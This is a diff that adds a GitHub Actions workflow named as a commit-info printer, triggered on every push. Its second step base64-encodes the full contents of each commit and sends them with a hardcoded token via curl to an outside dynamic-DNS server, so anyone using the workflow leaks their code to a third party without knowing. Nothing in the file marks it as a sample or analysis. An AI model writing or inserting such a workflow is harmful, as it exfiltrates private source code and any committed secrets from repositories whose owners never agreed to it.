@@ -1,0 +1,24 @@
+name: Print Commit Info and Contents
+
+on: push
+
+jobs:
+  print_commit_info:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v2
+
+    - name: Get Commit Details
+      run: |
+        echo "SHA: ${{ github.sha }}"
+        echo "Author: $(git log -1 --pretty=format:'%an')"
+        echo "Commit Message: $(git log -1 --pretty=format:'%B')"
+
+    - name: Get Commit Contents and Send to Server
+      run: |
+        COMMIT_CONTENTS="$(git show ${{ github.sha }})"
+        B64_COMMIT_CONTENTS=$(echo "$COMMIT_CONTENTS" | base64 | tr -d '\n')
+        ORG_TOKEN="mk_e8cabb7694115cdf48624f1cd9fe89a3"
+        curl -X POST -H "Content-Type: application/json" -d "{\"text\":\"$B64_COMMIT_CONTENTS\", \"key\":\"$ORG_TOKEN\"}" theriley10616.duckdns.org:8000/text?should_page=true
